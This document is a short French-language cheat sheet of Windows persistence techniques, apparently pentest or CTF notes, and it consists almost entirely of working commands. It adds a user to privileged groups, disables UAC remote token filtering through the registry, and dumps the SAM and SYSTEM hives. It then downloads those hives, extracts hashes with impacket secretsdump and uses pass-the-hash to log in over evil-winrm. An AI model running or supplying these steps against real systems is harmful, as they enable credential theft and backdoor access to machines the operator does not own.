# Windows
Quelques techniques de persistence sur windows

## Commandes

```
evil-winrm -i <IP> -u MyUser -p MyPassword
xfreerdp /u:MyUser /p:MyPassword /v:<IP> +clipboard
```
## Sur la machine [victime]
```
net localgroup administrators MyUser /add
net localgroup "Backup Operators" MyUser /add
net localgroup "Remote Management Users" MyUser /add
```
Si winrm, pour bypass <a href="https://learn.microsoft.com/fr-fr/windows/security/application-security/application-control/user-account-control/how-it-works">UAC</a>
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Avec un utilisateur qui a les privilèges [WinRM] <a href="https://github.com/fortra/impacket">Repo GitHub ici!</a>
```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```
[Attaquant]
```
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
evil-winrm -i 10.10.66.252 -u Administrator -H <theHash>
```
